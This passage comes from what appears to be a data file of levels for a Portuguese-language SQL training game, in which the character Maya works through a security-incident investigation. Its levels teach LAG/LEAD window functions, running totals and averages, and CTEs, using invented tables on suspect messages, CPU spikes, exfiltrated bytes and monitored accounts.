        example: "-- Para cada máquina, mostrar o tempo até a próxima manutenção registrada\nSELECT maquina_id, manutencao_id, realizada_em,\n    LEAD(realizada_em) OVER (\n        PARTITION BY maquina_id\n        ORDER BY realizada_em ASC, manutencao_id ASC\n    ) - realizada_em AS dias_ate_proxima\nFROM manutencoes;"
    },
    schemaDDL: `
        CREATE TABLE suspect_messages (
            message_id INTEGER PRIMARY KEY,
            sender_id TEXT NOT NULL,
            content TEXT NOT NULL,
            sent_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO suspect_messages (message_id, sender_id, content, sent_at) VALUES
        (1, 'SUS-01', 'Pacote chegou?', 100),
        (2, 'SUS-01', 'Confirma local de entrega', 105),
        (3, 'SUS-01', 'Silencio ate nova ordem', 300),
        (4, 'SUS-01', 'Executar fase 2', 600),
        (5, 'SUS-02', 'Cambio pronto', 50),
        (6, 'SUS-02', 'Enviando agora', 60),
        (7, 'SUS-02', 'Recebido', 61),
        (8, 'SUS-03', 'Aguardando sinal verde', 10),
        (9, 'SUS-03', 'Sinal verde recebido', 500),
        (10, 'SUS-03', 'Iniciando transferencia', 505),
        (11, 'SUS-04', 'Reuniao confirmada', 1000),
        (12, 'SUS-04', 'Local alterado', 1100),
        (13, 'SUS-04', 'Novo ponto de encontro', 1300),
        (14, 'SUS-01', 'Fase 2 confirmada', 601);
    `,
    expectedQuery: `
        WITH ReplyGap AS (
            SELECT message_id, sender_id, content,
                LEAD(sent_at) OVER (
                    PARTITION BY sender_id
                    ORDER BY sent_at ASC, message_id ASC
                ) - sent_at AS intervalo_resposta
            FROM suspect_messages
        )
        SELECT message_id, sender_id, content, intervalo_resposta
        FROM ReplyGap
        WHERE intervalo_resposta IS NOT NULL AND intervalo_resposta <= 10
        ORDER BY sender_id ASC, message_id ASC;
    `,
    hint: "Empregue LEAD(sent_at) OVER (PARTITION BY sender_id ORDER BY sent_at ASC, message_id ASC) dentro de uma CTE, subtraia sent_at, e filtre o resultado com <= 10."
},
{
    id: 70,
    tier: "avancado",
    certModule: "LAG() e LEAD() — Comparando Linhas Vizinhas",
    title: "Nível 70: O Pico de CPU do Processo",
    briefing: "Os logs de monitoramento de processos mostram picos repentinos de uso de CPU, típicos de mineração de criptomoeda instalada às escondidas. Maya precisa localizar cada leitura onde o uso de CPU saltou 40 pontos percentuais ou mais em relação à leitura anterior do mesmo processo.",
    objective: "Utilize LAG para obter o cpu_percent da leitura ANTERIOR do mesmo process_name (ordenado por logged_at ASC, com log_id ASC como desempate). Calcule o aumento como (cpu_percent atual menos o valor anterior) e projete-o como aumento_cpu. Projete log_id, process_name, cpu_percent e aumento_cpu. Exiba apenas linhas onde aumento_cpu não for nulo e for maior ou igual a 40. Ordene por process_name ASC e log_id ASC.",
    theory: {
        title: "Window Functions — LAG() e LEAD() (Linhas Vizinhas)",
        explanation: "LAG() e LEAD() são funções analíticas que trazem o valor de outra linha para dentro da linha atual, sem precisar de um JOIN. LAG(coluna) acessa a linha ANTERIOR dentro da mesma partição (definida por PARTITION BY) e ORDER BY; LEAD(coluna) acessa a linha SEGUINTE. Isso é essencial para comparar um evento com o que veio antes ou depois dele na mesma sequência, como calcular o tempo decorrido entre dois eventos consecutivos.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_tempo,\n    LAG(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_anterior,\n    LEAD(coluna_tempo) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n    ) AS valor_seguinte\nFROM tabela;",
        example: "-- Para cada máquina, mostrar o tempo até a próxima manutenção registrada\nSELECT maquina_id, manutencao_id, realizada_em,\n    LEAD(realizada_em) OVER (\n        PARTITION BY maquina_id\n        ORDER BY realizada_em ASC, manutencao_id ASC\n    ) - realizada_em AS dias_ate_proxima\nFROM manutencoes;"
    },
    schemaDDL: `
        CREATE TABLE process_cpu_log (
            log_id INTEGER PRIMARY KEY,
            process_name TEXT NOT NULL,
            cpu_percent REAL NOT NULL,
            logged_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO process_cpu_log (log_id, process_name, cpu_percent, logged_at) VALUES
        (1, 'miner.exe', 5, 1),
        (2, 'miner.exe', 8, 2),
        (3, 'miner.exe', 95, 3),
        (4, 'miner.exe', 90, 4),
        (5, 'sshd', 10, 1),
        (6, 'sshd', 12, 2),
        (7, 'sshd', 55, 3),
        (8, 'sshd', 13, 4),
        (9, 'backup_agent', 20, 1),
        (10, 'backup_agent', 65, 2),
        (11, 'backup_agent', 70, 3),
        (12, 'cron', 3, 1),
        (13, 'cron', 4, 2),
        (14, 'cron', 5, 3);
    `,
    expectedQuery: `
        WITH CpuDelta AS (
            SELECT log_id, process_name, cpu_percent,
                cpu_percent - LAG(cpu_percent) OVER (
                    PARTITION BY process_name
                    ORDER BY logged_at ASC, log_id ASC
                ) AS aumento_cpu
            FROM process_cpu_log
        )
        SELECT log_id, process_name, cpu_percent, aumento_cpu
        FROM CpuDelta
        WHERE aumento_cpu IS NOT NULL AND aumento_cpu >= 40
        ORDER BY process_name ASC, log_id ASC;
    `,
    hint: "Empregue LAG(cpu_percent) OVER (PARTITION BY process_name ORDER BY logged_at ASC, log_id ASC) dentro de uma CTE, calcule cpu_percent menos o valor anterior, e filtre o resultado com >= 40."
},
{
    id: 71,
    tier: "avancado",
    certModule: "SUM()/AVG() OVER — Totais e Médias Acumuladas",
    title: "Nível 71: O Saldo Acumulado da Conta Monitorada",
    briefing: "As contas sob vigilância direta da força-tarefa da Aethelgard precisam ter seu fluxo financeiro reconstruído passo a passo. Maya quer ver, transferência após transferência, como o total acumulado evoluiu em cada conta monitorada.",
    objective: "Considere apenas transferências com is_monitored = 1. Calcule o total acumulado (running total) de amount por account_id, ordenado por occurred_at ASC (com transfer_id ASC como desempate), como saldo_acumulado. Projete transfer_id, account_id, amount e saldo_acumulado. Ordene por account_id ASC, occurred_at ASC e transfer_id ASC.",
    theory: {
        title: "Window Functions — SUM()/AVG() OVER (Totais Acumulados)",
        explanation: "SUM() e AVG() também funcionam como window functions quando usadas com OVER (PARTITION BY ... ORDER BY ...). Diferente do GROUP BY, elas não reduzem a quantidade de linhas: cada linha mantém sua identidade individual, mas ganha uma coluna extra com o total (ou média) acumulado até aquele ponto da sequência, dentro do seu grupo. Definir explicitamente o frame com ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW garante que o cálculo considere exatamente da primeira linha do grupo até a linha atual.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_valor,\n    SUM(coluna_valor) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_acumulado\nFROM tabela;",
        example: "-- Para cada cliente, mostrar o total acumulado de pedidos ao longo do tempo\nSELECT cliente_id, pedido_id, valor_pedido,\n    SUM(valor_pedido) OVER (\n        PARTITION BY cliente_id\n        ORDER BY data_pedido ASC, pedido_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_gasto_acumulado\nFROM pedidos;"
    },
    schemaDDL: `
        CREATE TABLE wire_transfers (
            transfer_id INTEGER PRIMARY KEY,
            account_id TEXT NOT NULL,
            amount REAL NOT NULL,
            is_monitored INTEGER NOT NULL,
            occurred_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO wire_transfers (transfer_id, account_id, amount, is_monitored, occurred_at) VALUES
        (1, 'ACC-M1', 1000, 1, 1),
        (2, 'ACC-M1', 500, 1, 2),
        (3, 'ACC-M1', 250, 1, 3),
        (4, 'ACC-M2', 2000, 1, 1),
        (5, 'ACC-M2', -500, 1, 2),
        (6, 'ACC-M2', 300, 1, 3),
        (7, 'ACC-M3', 100, 1, 1),
        (8, 'ACC-M3', 100, 1, 2),
        (9, 'ACC-N1', 5000, 0, 1),
        (10, 'ACC-N1', 5000, 0, 2),
        (11, 'ACC-M1', 750, 1, 4),
        (12, 'ACC-M2', 1000, 1, 4),
        (13, 'ACC-M3', 50, 1, 3),
        (14, 'ACC-N1', 100, 0, 3);
    `,
    expectedQuery: `
        WITH MonitoredTransfers AS (
            SELECT transfer_id, account_id, amount, occurred_at,
                SUM(amount) OVER (
                    PARTITION BY account_id
                    ORDER BY occurred_at ASC, transfer_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS saldo_acumulado
            FROM wire_transfers
            WHERE is_monitored = 1
        )
        SELECT transfer_id, account_id, amount, saldo_acumulado
        FROM MonitoredTransfers
        ORDER BY account_id ASC, occurred_at ASC, transfer_id ASC;
    `,
    hint: "Filtre is_monitored = 1 e use SUM(amount) OVER (PARTITION BY account_id ORDER BY occurred_at ASC, transfer_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)."
},
{
    id: 72,
    tier: "avancado",
    certModule: "SUM()/AVG() OVER — Totais e Médias Acumuladas",
    title: "Nível 72: O Consumo Médio dos Dispositivos Ativos",
    briefing: "A rede de dispositivos IoT da planta industrial pode estar mascarando um consumo energético anômalo por trás de equipamentos legítimos. Maya quer acompanhar a média acumulada de consumo de cada dispositivo que estava ativo no momento das leituras.",
    objective: "Considere apenas leituras com device_status = 'ATIVO'. Calcule a média acumulada (cumulative average) de consumption_kwh por device_id, ordenada por logged_at ASC (com log_id ASC como desempate), como media_acumulada. Projete log_id, device_id, consumption_kwh e media_acumulada. Ordene por device_id ASC, logged_at ASC e log_id ASC.",
    theory: {
        title: "Window Functions — SUM()/AVG() OVER (Totais Acumulados)",
        explanation: "SUM() e AVG() também funcionam como window functions quando usadas com OVER (PARTITION BY ... ORDER BY ...). Diferente do GROUP BY, elas não reduzem a quantidade de linhas: cada linha mantém sua identidade individual, mas ganha uma coluna extra com o total (ou média) acumulado até aquele ponto da sequência, dentro do seu grupo. Definir explicitamente o frame com ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW garante que o cálculo considere exatamente da primeira linha do grupo até a linha atual.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_valor,\n    SUM(coluna_valor) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_acumulado\nFROM tabela;",
        example: "-- Para cada cliente, mostrar o total acumulado de pedidos ao longo do tempo\nSELECT cliente_id, pedido_id, valor_pedido,\n    SUM(valor_pedido) OVER (\n        PARTITION BY cliente_id\n        ORDER BY data_pedido ASC, pedido_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_gasto_acumulado\nFROM pedidos;"
    },
    schemaDDL: `
        CREATE TABLE power_consumption_log (
            log_id INTEGER PRIMARY KEY,
            device_id TEXT NOT NULL,
            consumption_kwh REAL NOT NULL,
            device_status TEXT NOT NULL,
            logged_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO power_consumption_log (log_id, device_id, consumption_kwh, device_status, logged_at) VALUES
        (1, 'DEV-A', 10.0, 'ATIVO', 1),
        (2, 'DEV-A', 20.0, 'ATIVO', 2),
        (3, 'DEV-A', 30.0, 'ATIVO', 3),
        (4, 'DEV-B', 5.0, 'ATIVO', 1),
        (5, 'DEV-B', 15.0, 'ATIVO', 2),
        (6, 'DEV-C', 8.0, 'ATIVO', 1),
        (7, 'DEV-C', 8.0, 'ATIVO', 2),
        (8, 'DEV-C', 8.0, 'ATIVO', 3),
        (9, 'DEV-D', 100.0, 'INATIVO', 1),
        (10, 'DEV-D', 100.0, 'INATIVO', 2),
        (11, 'DEV-A', 40.0, 'ATIVO', 4),
        (12, 'DEV-B', 10.0, 'ATIVO', 3),
        (13, 'DEV-C', 20.0, 'ATIVO', 4),
        (14, 'DEV-D', 50.0, 'INATIVO', 3);
    `,
    expectedQuery: `
        WITH ActiveConsumption AS (
            SELECT log_id, device_id, consumption_kwh, logged_at,
                AVG(consumption_kwh) OVER (
                    PARTITION BY device_id
                    ORDER BY logged_at ASC, log_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS media_acumulada
            FROM power_consumption_log
            WHERE device_status = 'ATIVO'
        )
        SELECT log_id, device_id, consumption_kwh, media_acumulada
        FROM ActiveConsumption
        ORDER BY device_id ASC, logged_at ASC, log_id ASC;
    `,
    hint: "Filtre device_status = 'ATIVO' e use AVG(consumption_kwh) OVER (PARTITION BY device_id ORDER BY logged_at ASC, log_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)."
},
{
    id: 73,
    tier: "avancado",
    certModule: "SUM()/AVG() OVER — Totais e Médias Acumuladas",
    title: "Nível 73: O Valor Acumulado em Trânsito",
    briefing: "Para reconstruir o fluxo de mercadorias movimentado por cada fornecedor durante o período do incidente, Maya precisa ver o valor total acumulado das remessas efetivamente concluídas, na ordem em que foram despachadas.",
    objective: "Considere apenas remessas com shipment_status = 'CONCLUIDO'. Calcule o total acumulado (running total) de cargo_value por supplier_id, ordenado por shipped_at ASC (com shipment_id ASC como desempate), como valor_acumulado. Projete shipment_id, supplier_id, cargo_value e valor_acumulado. Ordene por supplier_id ASC, shipped_at ASC e shipment_id ASC.",
    theory: {
        title: "Window Functions — SUM()/AVG() OVER (Totais Acumulados)",
        explanation: "SUM() e AVG() também funcionam como window functions quando usadas com OVER (PARTITION BY ... ORDER BY ...). Diferente do GROUP BY, elas não reduzem a quantidade de linhas: cada linha mantém sua identidade individual, mas ganha uma coluna extra com o total (ou média) acumulado até aquele ponto da sequência, dentro do seu grupo. Definir explicitamente o frame com ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW garante que o cálculo considere exatamente da primeira linha do grupo até a linha atual.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_valor,\n    SUM(coluna_valor) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_acumulado\nFROM tabela;",
        example: "-- Para cada cliente, mostrar o total acumulado de pedidos ao longo do tempo\nSELECT cliente_id, pedido_id, valor_pedido,\n    SUM(valor_pedido) OVER (\n        PARTITION BY cliente_id\n        ORDER BY data_pedido ASC, pedido_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_gasto_acumulado\nFROM pedidos;"
    },
    schemaDDL: `
        CREATE TABLE freight_shipments (
            shipment_id INTEGER PRIMARY KEY,
            supplier_id TEXT NOT NULL,
            cargo_value REAL NOT NULL,
            shipment_status TEXT NOT NULL,
            shipped_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO freight_shipments (shipment_id, supplier_id, cargo_value, shipment_status, shipped_at) VALUES
        (1, 'FORN-X', 1000, 'CONCLUIDO', 1),
        (2, 'FORN-X', 2000, 'CONCLUIDO', 2),
        (3, 'FORN-X', 1500, 'CONCLUIDO', 3),
        (4, 'FORN-Y', 500, 'CONCLUIDO', 1),
        (5, 'FORN-Y', 500, 'CONCLUIDO', 2),
        (6, 'FORN-Z', 3000, 'CONCLUIDO', 1),
        (7, 'FORN-Z', 1000, 'CONCLUIDO', 2),
        (8, 'FORN-Z', 2000, 'CONCLUIDO', 3),
        (9, 'FORN-W', 9000, 'CANCELADO', 1),
        (10, 'FORN-W', 8000, 'CANCELADO', 2),
        (11, 'FORN-X', 500, 'CONCLUIDO', 4),
        (12, 'FORN-Y', 1000, 'CONCLUIDO', 3),
        (13, 'FORN-Z', 500, 'CANCELADO', 4),
        (14, 'FORN-X', 250, 'CONCLUIDO', 5);
    `,
    expectedQuery: `
        WITH CompletedShipments AS (
            SELECT shipment_id, supplier_id, cargo_value, shipped_at,
                SUM(cargo_value) OVER (
                    PARTITION BY supplier_id
                    ORDER BY shipped_at ASC, shipment_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS valor_acumulado
            FROM freight_shipments
            WHERE shipment_status = 'CONCLUIDO'
        )
        SELECT shipment_id, supplier_id, cargo_value, valor_acumulado
        FROM CompletedShipments
        ORDER BY supplier_id ASC, shipped_at ASC, shipment_id ASC;
    `,
    hint: "Filtre shipment_status = 'CONCLUIDO' e use SUM(cargo_value) OVER (PARTITION BY supplier_id ORDER BY shipped_at ASC, shipment_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)."
},
{
    id: 74,
    tier: "avancado",
    certModule: "SUM()/AVG() OVER — Totais e Médias Acumuladas",
    title: "Nível 74: Os Bytes Exfiltrados Acumulados",
    briefing: "Maya isolou os eventos de rede classificados como exfiltração de dados em cada host comprometido. Agora ela precisa visualizar o volume total de bytes vazado acumulado ao longo do tempo, host por host, para dimensionar o vazamento.",
    objective: "Considere apenas eventos com event_type = 'EXFILTRACAO'. Calcule o total acumulado (running total) de bytes_transferred por host_id, ordenado por event_time ASC (com event_id ASC como desempate), como bytes_acumulados. Projete event_id, host_id, bytes_transferred e bytes_acumulados. Ordene por host_id ASC, event_time ASC e event_id ASC.",
    theory: {
        title: "Window Functions — SUM()/AVG() OVER (Totais Acumulados)",
        explanation: "SUM() e AVG() também funcionam como window functions quando usadas com OVER (PARTITION BY ... ORDER BY ...). Diferente do GROUP BY, elas não reduzem a quantidade de linhas: cada linha mantém sua identidade individual, mas ganha uma coluna extra com o total (ou média) acumulado até aquele ponto da sequência, dentro do seu grupo. Definir explicitamente o frame com ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW garante que o cálculo considere exatamente da primeira linha do grupo até a linha atual.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_valor,\n    SUM(coluna_valor) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_acumulado\nFROM tabela;",
        example: "-- Para cada cliente, mostrar o total acumulado de pedidos ao longo do tempo\nSELECT cliente_id, pedido_id, valor_pedido,\n    SUM(valor_pedido) OVER (\n        PARTITION BY cliente_id\n        ORDER BY data_pedido ASC, pedido_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_gasto_acumulado\nFROM pedidos;"
    },
    schemaDDL: `
        CREATE TABLE exfil_events (
            event_id INTEGER PRIMARY KEY,
            host_id TEXT NOT NULL,
            bytes_transferred INTEGER NOT NULL,
            event_type TEXT NOT NULL,
            event_time INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO exfil_events (event_id, host_id, bytes_transferred, event_type, event_time) VALUES
        (1, 'HOST-X1', 1000, 'EXFILTRACAO', 1),
        (2, 'HOST-X1', 2500, 'EXFILTRACAO', 2),
        (3, 'HOST-X1', 4000, 'EXFILTRACAO', 3),
        (4, 'HOST-X2', 500, 'EXFILTRACAO', 1),
        (5, 'HOST-X2', 500, 'EXFILTRACAO', 2),
        (6, 'HOST-X3', 10000, 'EXFILTRACAO', 1),
        (7, 'HOST-X3', 5000, 'EXFILTRACAO', 2),
        (8, 'HOST-X3', 5000, 'EXFILTRACAO', 3),
        (9, 'HOST-X4', 200, 'ROTINA', 1),
        (10, 'HOST-X4', 300, 'ROTINA', 2),
        (11, 'HOST-X1', 1500, 'EXFILTRACAO', 4),
        (12, 'HOST-X2', 2000, 'EXFILTRACAO', 3),
        (13, 'HOST-X3', 100, 'ROTINA', 4),
        (14, 'HOST-X4', 400, 'ROTINA', 3);
    `,
    expectedQuery: `
        WITH ExfilOnly AS (
            SELECT event_id, host_id, bytes_transferred, event_time,
                SUM(bytes_transferred) OVER (
                    PARTITION BY host_id
                    ORDER BY event_time ASC, event_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS bytes_acumulados
            FROM exfil_events
            WHERE event_type = 'EXFILTRACAO'
        )
        SELECT event_id, host_id, bytes_transferred, bytes_acumulados
        FROM ExfilOnly
        ORDER BY host_id ASC, event_time ASC, event_id ASC;
    `,
    hint: "Filtre event_type = 'EXFILTRACAO' e use SUM(bytes_transferred) OVER (PARTITION BY host_id ORDER BY event_time ASC, event_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)."
},
{
    id: 75,
    tier: "avancado",
    certModule: "SUM()/AVG() OVER — Totais e Médias Acumuladas",
    title: "Nível 75: As Horas Extras Acumuladas",
    briefing: "Para provar que um departamento estava operando fora do horário normal na noite do ataque, Maya precisa somar, na ordem em que foram lançadas, todas as horas extras que já passaram pela etapa de aprovação.",
    objective: "Considere apenas registros com approval_status = 'APROVADO'. Calcule o total acumulado (running total) de hours por department, ordenado por logged_at ASC (com entry_id ASC como desempate), como horas_acumuladas. Projete entry_id, department, hours e horas_acumuladas. Ordene por department ASC, logged_at ASC e entry_id ASC.",
    theory: {
        title: "Window Functions — SUM()/AVG() OVER (Totais Acumulados)",
        explanation: "SUM() e AVG() também funcionam como window functions quando usadas com OVER (PARTITION BY ... ORDER BY ...). Diferente do GROUP BY, elas não reduzem a quantidade de linhas: cada linha mantém sua identidade individual, mas ganha uma coluna extra com o total (ou média) acumulado até aquele ponto da sequência, dentro do seu grupo. Definir explicitamente o frame com ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW garante que o cálculo considere exatamente da primeira linha do grupo até a linha atual.",
        syntax: "SELECT coluna_id, coluna_grupo, coluna_valor,\n    SUM(coluna_valor) OVER (\n        PARTITION BY coluna_grupo\n        ORDER BY coluna_tempo ASC, coluna_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_acumulado\nFROM tabela;",
        example: "-- Para cada cliente, mostrar o total acumulado de pedidos ao longo do tempo\nSELECT cliente_id, pedido_id, valor_pedido,\n    SUM(valor_pedido) OVER (\n        PARTITION BY cliente_id\n        ORDER BY data_pedido ASC, pedido_id ASC\n        ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW\n    ) AS total_gasto_acumulado\nFROM pedidos;"
    },
    schemaDDL: `
        CREATE TABLE overtime_log (
            entry_id INTEGER PRIMARY KEY,
            department TEXT NOT NULL,
            hours REAL NOT NULL,
            approval_status TEXT NOT NULL,
            logged_at INTEGER NOT NULL
        );
    `,
    seedData: `
        INSERT INTO overtime_log (entry_id, department, hours, approval_status, logged_at) VALUES
        (1, 'TI', 5.0, 'APROVADO', 1),
        (2, 'TI', 3.0, 'APROVADO', 2),
        (3, 'TI', 2.0, 'APROVADO', 3),
        (4, 'VENDAS', 4.0, 'APROVADO', 1),
        (5, 'VENDAS', 4.0, 'APROVADO', 2),
        (6, 'LOGISTICA', 8.0, 'APROVADO', 1),
        (7, 'LOGISTICA', 2.0, 'APROVADO', 2),
        (8, 'LOGISTICA', 1.0, 'APROVADO', 3),
        (9, 'MARKETING', 6.0, 'REJEITADO', 1),
        (10, 'MARKETING', 6.0, 'REJEITADO', 2),
        (11, 'TI', 6.0, 'APROVADO', 4),
        (12, 'VENDAS', 2.0, 'APROVADO', 3),
        (13, 'LOGISTICA', 3.0, 'REJEITADO', 4),
        (14, 'MARKETING', 1.0, 'REJEITADO', 3);
    `,
    expectedQuery: `
        WITH ApprovedOvertime AS (
            SELECT entry_id, department, hours, logged_at,
                SUM(hours) OVER (
                    PARTITION BY department
                    ORDER BY logged_at ASC, entry_id ASC
                    ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW
                ) AS horas_acumuladas
            FROM overtime_log
            WHERE approval_status = 'APROVADO'
        )
        SELECT entry_id, department, hours, horas_acumuladas
        FROM ApprovedOvertime
        ORDER BY department ASC, logged_at ASC, entry_id ASC;
    `,
    hint: "Filtre approval_status = 'APROVADO' e use SUM(hours) OVER (PARTITION BY department ORDER BY logged_at ASC, entry_id ASC ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW)."
},
{
    id: 76,
    tier: "avancado",
    certModule: "CTE (WITH) — Consultas Nomeadas",
    title: "Nível 76: Contas Acima do Limite",
    briefing: "Maya quer separar rapidamente as contas corporativas cujo volume total de transações no período do incidente ultrapassa um limite de risco pré-definido pela equipe de segurança da Aethelgard.",
    objective: "Crie uma CTE que calcule a soma de amount por account_id como total_gasto. Na consulta externa, selecione account_id e total_gasto apenas para contas com total_gasto maior que 5000. Ordene por total_gasto decrescente e account_id ascendente como critério de desempate.",
    theory: {
        title: "CTE (WITH) — Consultas Nomeadas em Duas Etapas",
        explanation: "Uma CTE (Common Table Expression), definida com WITH, cria uma tabela temporária nomeada válida apenas durante a execução da consulta. Isso permite quebrar um problema complexo em etapas nomeadas e legíveis: primeiro calcular uma métrica agregada em uma etapa, depois filtrar ou comparar essa métrica em uma consulta externa — sem precisar de subconsultas aninhadas difíceis de ler.",
        syntax: "WITH MetricaPorGrupo AS (\n    SELECT coluna_grupo, AGREGACAO(coluna_valor) AS metrica\n    FROM tabela\n    GROUP BY coluna_grupo\n)\nSELECT coluna_grupo, metrica\nFROM MetricaPorGrupo\nWHERE metrica > :limiar;",
        example: "-- Encontrar filiais cujo total de vendas supera 100000\nWITH VendasPorFilial AS (\n    SELECT filial_id, SUM(valor_venda) AS total_vendas\n    FROM vendas\n    GROUP BY filial_id\n)\nSELECT filial_id, total_vendas\nFROM VendasPorFilial\nWHERE total_vendas > 100000;"
    },
    schemaDDL: `
        CREATE TABLE monthly_transactions (
            transaction_id INTEGER PRIMARY KEY,
            account_id TEXT NOT NULL,
            amount REAL NOT NULL,
            transaction_month TEXT NOT NULL
        );
    `,
    seedData: `
        INSERT INTO monthly_transactions (transaction_id, account_id, amount, transaction_month) VALUES
        (1, 'ACC-1', 3000, '2026-01'),
        (2, 'ACC-1', 2000, '2026-01'),
        (3, 'ACC-1', 1000, '2026-02'),
        (4, 'ACC-2', 1000, '2026-01'),
        (5, 'ACC-2', 500, '2026-02'),
        (6, 'ACC-3', 4000, '2026-01'),
        (7, 'ACC-3', 4000, '2026-02'),
        (8, 'ACC-4', 500, '2026-01'),
        (9, 'ACC-4', 500, '2026-02'),
        (10, 'ACC-4', 500, '2026-03'),
        (11, 'ACC-1', 2500, '2026-03'),
        (12, 'ACC-2', 200, '2026-03'),
        (13, 'ACC-3', 1000, '2026-03'),
        (14, 'ACC-4', 100, '2026-04');
    `,
    expectedQuery: `
        WITH TotaisPorConta AS (
            SELECT account_id, SUM(amount) AS total_gasto
            FROM monthly_transactions
            GROUP BY account_id
        )
        SELECT account_id, total_gasto
        FROM TotaisPorConta
        WHERE total_gasto > 5000
        ORDER BY total_gasto DESC, account_id ASC;
    `,
    hint: "Construa uma CTE com SUM(amount) AS total_gasto agrupado por account_id, e depois filtre a consulta externa com WHERE total_gasto > 5000."
},
{
    id: 77,
    tier: "avancado",
    certModule: "CTE (WITH) — Consultas Nomeadas",
    title: "Nível 77: Dispositivos Acima da Média",
    briefing: "Uma leitura isolada de temperatura alta não prova nada, mas um dispositivo cuja média histórica está acima da média de toda a frota merece atenção especial da perícia de Maya.",
    objective: "Crie uma CTE que calcule a média de temperature por device_id como media_temp. Na consulta externa, selecione device_id e media_temp apenas para dispositivos cuja media_temp seja maior que a média geral de temperature de TODA a tabela sensor_temperature_log (use uma subconsulta escalar). Ordene por media_temp decrescente e device_id ascendente.",
    theory: {
        title: "CTE (WITH) — Consultas Nomeadas em Duas Etapas",
        explanation: "Uma CTE (Common Table Expression), definida com WITH, cria uma tabela temporária nomeada válida apenas durante a execução da consulta. Isso permite quebrar um problema complexo em etapas nomeadas e legíveis: primeiro calcular uma métrica agregada em uma etapa, depois filtrar ou comparar essa métrica em uma consulta externa — sem precisar de subconsultas aninhadas difíceis de ler.",
        syntax: "WITH MetricaPorGrupo AS (\n    SELECT coluna_grupo, AGREGACAO(coluna_valor) AS metrica\n    FROM tabela\n    GROUP BY coluna_grupo\n)\nSELECT coluna_grupo, metrica\nFROM MetricaPorGrupo\nWHERE metrica > :limiar;",
        example: "-- Encontrar filiais cujo total de vendas supera 100000\nWITH VendasPorFilial AS (\n    SELECT filial_id, SUM(valor_venda) AS total_vendas\n    FROM vendas\n    GROUP BY filial_id\n)\nSELECT filial_id, total_vendas\nFROM VendasPorFilial\nWHERE total_vendas > 100000;"
    },
    schemaDDL: `
        CREATE TABLE sensor_temperature_log (
            reading_id INTEGER PRIMARY KEY,
            device_id TEXT NOT NULL,
            temperature REAL NOT NULL
        );
    `,
    seedData: `
        INSERT INTO sensor_temperature_log (reading_id, device_id, temperature) VALUES
        (1, 'DEV-1', 90),
        (2, 'DEV-1', 92),
        (3, 'DEV-1', 88),
        (4, 'DEV-2', 20),
        (5, 'DEV-2', 22),
        (6, 'DEV-2', 18),
        (7, 'DEV-3', 100),
        (8, 'DEV-3', 102),
        (9, 'DEV-3', 98),
        (10, 'DEV-3', 100),
        (11, 'DEV-4', 25),
        (12, 'DEV-4', 25),
        (13, 'DEV-4', 25),
        (14, 'DEV-2', 20);
    `,
    expectedQuery: `
        WITH MediaPorDispositivo AS (
            SELECT device_id, AVG(temperature) AS media_temp
            FROM sensor_temperature_log
            GROUP BY device_id
        )
        SELECT device_id, media_temp
        FROM MediaPorDispositivo
        WHERE media_temp > (SELECT AVG(temperature) FROM sensor_temperature_log)
        ORDER BY media_temp DESC, device_id ASC;
    `,
    hint: "Construa uma CTE com AVG(temperature) AS media_temp agrupado por device_id, e compare media_temp com (SELECT AVG(temperature) FROM sensor_temperature_log) na consulta externa."
},
{
    id: 78,
    tier: "avancado",
    certModule: "CTE (WITH) — Consultas Nomeadas",
    title: "Nível 78: Fornecedores Reincidentes",
